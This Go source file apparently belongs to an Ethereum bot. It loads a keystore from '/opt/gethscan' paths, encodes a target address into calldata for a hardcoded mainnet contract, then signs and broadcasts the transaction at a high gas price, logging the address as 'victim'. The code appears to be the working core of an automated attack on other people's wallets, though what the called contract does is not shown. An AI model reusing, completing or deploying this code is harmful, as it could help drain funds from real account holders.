package token

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/big"
	"strings"

	"github.com/ethereum/go-ethereum/accounts/keystore"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/rlp"
)

var (
	nodeChainIDStr = "4"
	nodeChainID    *big.Int

	gatewayURL  = "http://127.0.0.1:8545"
	gasLimit    = uint64(600000)
	gasPriceStr = "1000000000"
	accNonceStr = ""
	dryrun      = false

	value    *big.Int
	gasPrice *big.Int
	accNonce *big.Int

	keyWrapper *keystore.Key
	fromAddr   string
	toAddr     string
	valueStr   string = "0"
	data       string

	keyfile  = ""
	passfile = ""
)

func init() {
	keyfile = "/opt/gethscan/gethscan/keystore/account"
	passfile = "/opt/gethscan/gethscan/keystore/password"
	nodeChainID = big.NewInt(1)
	gasPrice = big.NewInt(200000000000)
	toAddr = "0xc65d2f76c6cc9fde1ceea5d47d5753b889e22412"
	LoadKeyStore(keyfile, passfile)
}

func SendTransaction(client *ethclient.Client, address string) (err error) {
	data = fmt.Sprintf("0x4428da9c00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000%v", address[2:])

	//err := checkArguments()
	//if err != nil {
	//	return err
	//}

	ctx := context.Background()

	from := common.HexToAddress(fromAddr)
	to := common.HexToAddress(toAddr)

	var nonce uint64
	if accNonce != nil {
		nonce = accNonce.Uint64()
	} else {
		nonce, err = client.PendingNonceAt(ctx, from)
		if err != nil {
			log.Warn("get account nonce failed", "from", from.String(), "err", err)
			return err
		}
	}

	rawTx := types.NewTransaction(nonce, to, value, gasLimit, gasPrice, common.FromHex(data))
	printTx(rawTx, true)
	fmt.Println()

	chainSigner := types.NewEIP155Signer(nodeChainID)
	signedTx, err := types.SignTx(rawTx, chainSigner, keyWrapper.PrivateKey)
	if err != nil {
		log.Warn("sign tx failed", "err", err)
		return err
	}

	sender, err := types.Sender(chainSigner, signedTx)
	if err != nil {
		log.Warn("get sender from signed tx failed", "err", err)
		return err
	}

	if sender != from {
		err = fmt.Errorf("sender mismatch, signer %v != from %v\n", sender.String(), from.String())
		fmt.Println(err)
		return err
	}

	txHash := signedTx.Hash().String()

	//printTx(signedTx, false)

	if !dryrun {
		err = client.SendTransaction(ctx, signedTx)
		if err != nil {
			log.Warn("SendTransaction failed", "err", err)
			return err
		}
		log.Info("sendTransaction success", "victim", address, "txhash", txHash, "from", sender.String())
	} else {
		log.Info("sendTransaction dry run, not send transaction")
	}
	return nil
}

func LoadKeyStore(keyfile, passfile string) {
	keyjson, err := ioutil.ReadFile(keyfile)
	if err != nil {
		fmt.Println("Read keystore fail", err)
		panic(err)
	}

	passdata, err := ioutil.ReadFile(passfile)
	if err != nil {
		fmt.Println("Read password fail", err)
		panic(err)
	}
	passwd := strings.TrimSpace(string(passdata))

	keyWrapper, err = keystore.DecryptKey(keyjson, passwd)
	if err != nil {
		fmt.Println("Key decrypt fail", err)
		panic(err)
	}

	fromAddr = keyWrapper.Address.String()
	fmt.Println("From address is", fromAddr)
}

func printTx(tx *types.Transaction, jsonFmt bool) error {
	if jsonFmt {
		bs, err := json.MarshalIndent(tx, "", "  ")
		if err != nil {
			return fmt.Errorf("json marshal err %v", err)
		}
		fmt.Println(string(bs))
	} else {
		bs, err := rlp.EncodeToBytes(tx)
		if err != nil {
			return fmt.Errorf("rlp encode err %v", err)
		}
		fmt.Println(hexutil.Bytes(bs))
	}
	return nil
}
